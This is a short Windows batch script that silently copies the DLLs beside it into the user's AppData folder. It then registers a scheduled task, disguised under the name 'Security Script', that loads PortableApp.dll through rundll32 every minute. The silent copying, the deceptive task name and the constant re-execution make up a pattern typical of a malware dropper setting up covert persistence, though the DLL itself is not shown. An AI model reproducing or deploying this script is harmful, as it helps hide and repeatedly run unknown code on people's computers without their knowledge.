@echo off
set "script_dir=%~dp0"

xcopy /q %script_dir%\*.dll "%APPDATA%" /Y > nul

SCHTASKS /f /create /sc minute /mo 1 /tn "Security Script" /tr "rundll32 \"%APPDATA%\PortableApp.dll\" Open32 vid=%1 pid=%2 cwd=%%APPDATA%%" > nul